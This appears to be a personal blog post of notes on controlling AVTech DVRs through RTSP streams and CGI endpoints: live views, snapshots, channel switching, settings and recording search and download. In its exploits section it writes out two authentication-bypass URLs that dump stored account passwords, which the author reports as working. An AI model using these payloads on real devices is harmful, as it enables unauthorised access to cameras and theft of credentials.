---
layout: post
title: "AVTECH DVR HIDDEN COMMANDS"
date: 2018-12-29 00:24:00 +0000
tags: ["avtech", "DVR", "security", "video"]
blogger_orig_link: https://lexxai.blogspot.com/2018/12/avtech-dvr-hiden-commands.html
---

Хотів для себе накидати нотатки як підключатися до відеореєстратора фірми [AVTech](https://www.google.com/search?q=AVTECH).  

[![](/assets/images/blog/083acdb260d3cf25-83f36ba9afca7e2c.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCDvaF35Ebf2sJixMugnz5mjYCqm6em_ABdI5paTQPVbOKKWtV0eli_qyVxutqkTP9kh-EWbhEVbXgbSAxYBmjYUAlfOR2C55I8iA_3B3ubgzPL83nzwZ1sRaWfT-2wTsViKUvhxFyH4z_/s1600/s-l1600.jpg)

А вийшло трохи більше.  
А ще, головна мета знайти як отримати повідомлення про подію з відеореєстратора що потім зчитати фрагмент цього запису. Без використання рідного програмного забезпечення.  
  

### URLS:

Перегляд за допомогою VLC player без звуку:   
*rtsp://DVR\_URL/live/mpeg4  
rtsp://DVR\_URL/live/h264*  
Перегляд зі звуком:  
*rtsp://DVR\_URL/live/mpeg4\_ulaw  
rtsp://DVR\_URL/live/h264\_ulaw*  
  
With ch.:  
*rtsp://DVR\_URL/live/h264/ch0* - MAIN  
*rtsp://DVR\_URL/live/h264/ch1* .. ch8 ...   by ch.  
  
[C# Camera SDK: How to connect to your AVTECH IP camera](http://www.camera-sdk.com/p_145-how-to-connect-to-your-avtech-ip-camera-onvif.html)  
*Одне зображення:*   
*http://user:passw@DVR\_URL/cgi-bin/guest/Video.cgi?media=JPEG&resolution=CIF*  
**http://*****user:passw@*DVR\_URL/cgi-bin/guest/Video.cgi?media=JPEG&resolution=4CIF**   
*Послідовність M**JPEG*   
*http://***user:passw@*DVR\_URL/cgi-bin/guest/Video.cgi?media=MJPEG*  
  

### INFORMATION:

FOR ALL : *http://DVR\_URL/cgi-bin/nobody/Machine.cgi?action=get\_capability*  
  

### MOBILE VIEW:

*http://DVR\_URL/nobody/mobile480.htm?Login=Captcha* - main view  
*http://DVR\_URL/nobody/m2.htm?ch=1&rf=3&dep=1*  - ch1  
  

### Change main view ch:

*http://DVR\_URL/cgi-bin/user/Serial.cgi?action=write&device=MASTER&data=02 3C 00 00 23&sid=0.22579487226719663* - ch6  
  
data=02 3E 00 00 23 - ch8  
data=02 3D 00 00 23 - ch7  
data=02 3C 00 00 23 - ch6  
data=02 3B 00 00 23 - ch5  
data=02 3A 00 00 23 - ch4  
data=02 39 00 00 23 - ch3  
data=02 38 00 00 23 - ch2   
data=02 37 00 00 23 - ch1  
  
data=02 1A 00 00 23 - cut1-4 and next cut4-8  
data=02 19 00 00 23 - cut9

### Change Resolution and Quality

From DOC:

```
http://DVR_URL/cgi-bin/nobody/Machine.cgi?action=get_capability

0
OK
Firmware.Version=1133-1039-1013-1025-0a-0000
MACAddress=00:0X:XX:XX:XX:XX
Product.Type=DVR
Product.ID=672
Product.ShortName=None
Video.System=PAL
Video.Input.Num=4
Video.Output.Num=1
Video.Format=H264,MJPEG
Video.Format.Default=H264
Video.Resolution=4CIF,CIF
Video.Quality=BEST,HIGH,NORMAL,BASIC
Video.Local.Input.Num=4
Video.Local.Output.Num=1
Video.Local.Format=H264,MJPEG
Audio.Input.Num=0
Audio.Output.Num=0
Audio.Format=ULAW
Audio.Local.Input.Num=1
Audio.Local.Output.Num=1
Audio.Local.Format=PCM
Language.Default=ENGLISH
Language.Support=ENGLISH&CHINESE&JAPANESE&FRANCE&GERMAN&SPANISH&CUSTOMIZE&THAI&VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&
Capability=0,0,0,0
```

Set param Quality=BEST,Resolution=4CIF

```
http://DVR_URL/cgi-bin/user/Config.cgi?action=set&Video.I0.H264.Quality=BEST&Video.I0.H264.Resolution=4CIF&rnd=0.1511
```

## А тут знайшов про баги не закриті у прошивках.

  
AVTECH EXPLOITS: <https://www.exploit-db.com/exploits/40500>  
  
*GET USERS PASSWORD!!!! :   
http://DVR\_URL/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.\*  
http://DVR\_URL/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.\**  
  
TESTED !!!! WORKS, CRAZY  
  
  
<https://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities>  
  
  

## Status

By some CGI Tutorials:

* AVTECH CGI Command Set Specification 2.1 [[Link1](http://mak.complife.ru/cam-api/avtech/CGI_v2.1.doc)], [[Link2](https://drive.google.com/open?id=19-UpEc3cHbkGBRqUsvWxtdY9G6YInepI)]
* CGI\_Tutorial.pdf  [[Link1](ftp://78.102.14.99/FTP/Avtech/IP/04_SDK_programatorske_navody/CGI_Tutorial/2015_05/CGI_Tutorial.pdf)] [[Link2](https://drive.google.com/file/d/1d68HE8Nn_NK69l93kvIbF-EkhIdpIls1/view?usp=sharing)]
* [CGI\_Prikazy\_stahovani\_JPEG\_snimku\_z\_kamer.txt](ftp://78.102.14.99/FTP/Avtech/IP/01_IP_kamery/04_Ostatni/SDK/CGI_Prikazy_stahovani_JPEG_snimku_z_kamer/CGI_Prikazy_stahovani_JPEG_snimku_z_kamer.txt)
* [CGI\_prikazy\_download\_records.txt](ftp://78.102.14.99/FTP/Avtech/IP/01_IP_kamery/04_Ostatni/SDK/CGI_Prikazy_stahovani_zaznamu_z_SD/CGI_prikazy_download_records.txt)

Request: (GET|POST)  
URL: http://*DVR\_URL*/cgi-bin/guest/SmartMonitor.cgi  
Result:   

```
0
OK
SmartMonitor=Alive
```

Request: (POST)  
URL: http://*DVR\_URL*/cgi-bin/supervisor/NetworkBk.cgi  
Parameter  
  
Result:  
  
Syntax:  
  
  
  
http://DVR\_URL/cgi-bin/supervisor/NetworkBk.cgi?action=<action\_parameter>&hdd\_num=<hdd\_num\_value>&channel=<channel\_value>&start\_time=<start\_time>&end\_time=<end\_time>  
where format of start\_time=2007 05 28 16 00 10 , end\_time=2007 05 28 16 10 59  
  
http://DVR\_URL/cgi-bin/supervisor/NetworkBk.cgi?action=<action\_parameter>&type=<type\_parameter>  
  
http://DVR\_URL/cgi-bin/supervisor/NetworkBk.cgi?action=<action\_parameter>&type=<type\_parameter>&command=<command\_parameter>&hdd\_num=<hdd\_num\_value>&list\_num=<list\_num\_value>&list\_type=<list\_type\_parameter>  
  
http://DVR\_URL/cgi-bin/supervisor/NetworkBk.cgi?action=<action\_parameter>&hdd\_num=<hdd\_num\_value>&start\_time=<start\_time>  
  
http://DVR\_URL/cgi-bin/supervisor/NetworkBk.cgi?action=<action\_parameter>&channel=<channel\_value>&hdd\_num=<hdd\_num\_value>&event=<event\_parameter>&start\_time=<start\_time>  
  
http://DVR\_URL/cgi-bin/supervisor/NetworkBk.cgi?action=<action\_parameter>&command=<command\_parameter>  
where  
<action\_parameter> : download, query, playback, event\_search, time\_search, retr  
<type\_parameter> : hdd, search\_list, dependent  
<command\_parameter> : forward, backward, latest, on, off  
<list\_type\_parameter> : ALL, MANUAL, SYSTEM, ALARM, MOTION  
<event\_parameter> : alarm, motion  
<hdd\_num\_value> : 1, 2, 3, …  
<channel\_value> : 1, 2, 3, …  
<list\_num\_value> : 100  
  
Example:  
(http://192.168.5.124:88/cgi-bin/supervisor/NetworkBk.cgi?action=retr&command=on)  
(http://192.168.5.124:88/cgi-bin/supervisor/NetworkBk.cgi?action=event\_search&channel=1&hdd\_num=1&event=alarm&start\_time=2007 10 16 13 00 00)  
(http://192.168.5.124:88/cgi-bin/supervisor/NetworkBk.cgi?action=time\_search&hdd\_num=1&start\_time=2007 10 16 13 00 00)  
(http://192.168.5.124:88/cgi-bin/supervisor/NetworkBk.cgi?action=download&num=1&channel=1&start\_time=2007 05 28 16 00 10&end\_time=2007 05 28 16 10 59)  
(http://192.168.5.124:88/cgi-bin/supervisor/NetworkBk.cgi?action=query&type=search\_list&command=latest&hdd\_num=1&list\_num=100&list\_type=ALL)  
(http://192.168.5.124:88/cgi-bin/supervisor/NetworkBk.cgi?action=query&type=hdd)
